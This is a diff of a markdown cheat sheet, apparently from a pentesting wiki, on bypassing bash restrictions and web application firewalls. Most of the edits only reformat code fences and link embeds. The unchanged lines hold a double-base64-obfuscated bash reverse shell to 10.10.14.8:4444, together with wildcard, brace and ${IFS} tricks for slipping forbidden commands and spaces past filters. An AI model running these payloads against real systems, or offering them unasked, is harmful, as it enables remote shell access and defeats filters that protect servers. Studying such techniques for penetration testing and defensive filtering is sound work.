@@ -1,13 +1,16 @@
-# WAF Evasion / Bypass Bash Restrictions
+# Bypass Bash Restrictions
 
 ## Reverse Shell
-```sh
+
+```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 #echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
+
 ## Bypass Paths and forbidden commands
-```sh
+
+```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
 nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost
@@ -46,7 +49,8 @@ whoa # This will throw an error
 ```
 
 ## Bypass forbidden spaces
-```sh
+
+```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
 {echo,test} # echo test
@@ -77,16 +81,19 @@ uname!-1\-a # This equals to uname -a
 ```
 
 ## Bypass IPs
-```sh
+
+```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
 
 ## References & More
-{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits" %}
 
-{% embed url="https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet" %}
+{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection\#exploits" caption="" %}
 
-{% embed url="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0" %}
+{% embed url="https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet" caption="" %}
 
-{% embed url="https://www.secjuice.com/web-application-firewall-waf-evasion/" %}
+{% embed url="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0" caption="" %}
+
+{% embed url="https://www.secjuice.com/web-application-firewall-waf-evasion/" caption="" %}
+
